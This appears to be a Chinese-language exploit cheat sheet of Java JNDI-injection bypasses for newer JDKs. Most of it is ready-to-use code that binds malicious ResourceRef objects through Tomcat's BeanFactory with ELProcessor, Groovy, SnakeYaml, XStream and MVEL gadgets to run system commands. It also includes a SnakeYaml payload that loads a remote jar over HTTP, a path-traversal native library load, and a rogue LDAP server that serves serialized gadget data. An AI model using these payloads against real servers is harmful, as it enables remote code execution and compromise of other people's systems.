## Bypass High Version

- use `org.apache.naming.factory.BeanFactory`+`javax.el.ELProcessor`

  > 通过BeanFactory#getObjectInstance()方法实例化Reference，且可控
  >
  > 传入的Reference类必须要是ResourceRef类
  >
  > 需要存在Tomcat依赖

  ```java
  Registry registry = LocateRegistry.createRegistry(rmi_port);
  // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
  ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
  // 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码
  ref.add(new StringRefAddr("forceString", "KINGX=eval"));
  // 利用表达式执行命令
  ref.add(new StringRefAddr("KINGX", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"));
  
  ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
  registry.bind("Exploit", referenceWrapper);
  ```

- use  `org.apache.naming.factory.BeanFactory` +`groovy`

  ```java
  Registry registry = LocateRegistry.createRegistry(1099);
  ResourceRef resourceRef = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
  resourceRef.add(new StringRefAddr("forceString", "gungnir=parseClass"));
  String script = String.format("@groovy.transform.ASTTest(value={\nassert java.lang.Runtime.getRuntime().exec(\"%s\")\n})\ndef gungnir\n", "calc.exe");
  resourceRef.add(new StringRefAddr("gungnir",script));
  ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
  registry.bind("test", referenceWrapper);
  ```

- use  `org.apache.naming.factory.BeanFactory` +`SnakeYaml`

  ```java
  Registry registry = LocateRegistry.createRegistry(1099);
  ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",true, "org.apache.naming.factory.BeanFactory", null);
      String yaml = "!!javax.script.ScriptEngineManager [\n" +
              "  !!java.net.URLClassLoader [[\n" +
              "    !!java.net.URL [\"http://127.0.0.1:8888/exp.jar\"]\n" +
              "  ]]\n" +
              "]";
      ref.add(new StringRefAddr("forceString", "a=load"));
      ref.add(new StringRefAddr("a", yaml));
  ```

- [XStream](https://tttang.com/archive/1405/#toc_xstream)

  ```java
  private static ResourceRef tomcat_xstream(){
      ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "",
              true, "org.apache.naming.factory.BeanFactory", null);
      String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
              "  <unserializable-parents/>\n" +
              "  <java.util.PriorityQueue>\n" +
              "    <default>\n" +
              "      <size>2</size>\n" +
              "    </default>\n" +
              "    <int>3</int>\n" +
              "    <dynamic-proxy>\n" +
              "      <interface>java.lang.Comparable</interface>\n" +
              "      <handler class='sun.tracing.NullProvider'>\n" +
              "        <active>true</active>\n" +
              "        <providerType>java.lang.Comparable</providerType>\n" +
              "        <probes>\n" +
              "          <entry>\n" +
              "            <method>\n" +
              "              <class>java.lang.Comparable</class>\n" +
              "              <name>compareTo</name>\n" +
              "              <parameter-types>\n" +
              "                <class>java.lang.Object</class>\n" +
              "              </parameter-types>\n" +
              "            </method>\n" +
              "            <sun.tracing.dtrace.DTraceProbe>\n" +
              "              <proxy class='java.lang.Runtime'/>\n" +
              "              <implementing__method>\n" +
              "                <class>java.lang.Runtime</class>\n" +
              "                <name>exec</name>\n" +
              "                <parameter-types>\n" +
              "                  <class>java.lang.String</class>\n" +
              "                </parameter-types>\n" +
              "              </implementing__method>\n" +
              "            </sun.tracing.dtrace.DTraceProbe>\n" +
              "          </entry>\n" +
              "        </probes>\n" +
              "      </handler>\n" +
              "    </dynamic-proxy>\n" +
              "    <string>/System/Applications/Calculator.app/Contents/MacOS/Calculator</string>\n" +
              "  </java.util.PriorityQueue>\n" +
              "</java.util.PriorityQueue>";
      ref.add(new StringRefAddr("forceString", "a=fromXML"));
      ref.add(new StringRefAddr("a", xml));
      return ref;
  }
  ```

- `org.mvel2.sh.ShellSession`

  ```java
  private static ResourceRef tomcat_MVEL(){
      ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
              true, "org.apache.naming.factory.BeanFactory", null);
      ref.add(new StringRefAddr("forceString", "a=exec"));
      ref.add(new StringRefAddr("a",
              "push Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator');"));
      return ref;
  }
  ```

- `com.sun.glass.utils.NativeLibLoader`是JDK的类

  ```java
  private static ResourceRef tomcat_loadLibrary(){
      ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
              true, "org.apache.naming.factory.BeanFactory", null);
      ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
      ref.add(new StringRefAddr("a", "/../../../../../../../../../../../../tmp/libcmd"));
      return ref;
  }
  ```

  

- use 序列化数据+本地链子

  ```java
  import java.net.InetAddress;
  import java.net.URL;
  import javax.net.ServerSocketFactory;
  import javax.net.SocketFactory;
  import javax.net.ssl.SSLSocketFactory;
  import com.unboundid.ldap.listener.InMemoryDirectoryServer;
  import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
  import com.unboundid.ldap.listener.InMemoryListenerConfig;
  import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
  import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
  import com.unboundid.ldap.sdk.Entry;
  import com.unboundid.ldap.sdk.LDAPResult;
  import com.unboundid.ldap.sdk.ResultCode;
  import com.unboundid.util.Base64;
  
  public class Deserializebypass {
  
      private static final String LDAP_BASE = "dc=t4rrega,dc=domain";
  
      public static void main ( String[] tmp_args ) {
          String[] args=new String[]{"http://127.0.0.1/#Deserialize"};
          int port = 7777;
          try {
              InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
              config.setListenerConfigs(new InMemoryListenerConfig(
                      "listen", //$NON-NLS-1$
                      InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                      port,
                      ServerSocketFactory.getDefault(),
                      SocketFactory.getDefault(),
                      (SSLSocketFactory) SSLSocketFactory.getDefault()));
  
              config.addInMemoryOperationInterceptor(new Deserializebypass.OperationInterceptor(new URL(args[ 0 ])));
              InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
              System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
              ds.startListening();
  
          }
          catch ( Exception e ) {
              e.printStackTrace();
          }
      }
  
      private static class OperationInterceptor extends InMemoryOperationInterceptor {
  
          private URL codebase;
  
          public OperationInterceptor ( URL cb ) {
              this.codebase = cb;
          }
  
          @Override
          public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
              String base = result.getRequest().getBaseDN();
              Entry e = new Entry(base);
              try {
                  sendResult(result, base, e);
              }
              catch ( Exception e1 ) {
                  e1.printStackTrace();
              }
          }
  
          protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
              URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
              System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
              e.addAttribute("javaClassName", "foo");
              String cbstring = this.codebase.toString();
              int refPos = cbstring.indexOf('#');
              if ( refPos > 0 ) {
                  cbstring = cbstring.substring(0, refPos);
              }
              e.addAttribute("javaSerializedData", Base64.decode("xxx"));
              //这里填入对应的base64编码
              result.sendSearchEntry(e);
              result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
          }
      }
  }
  ```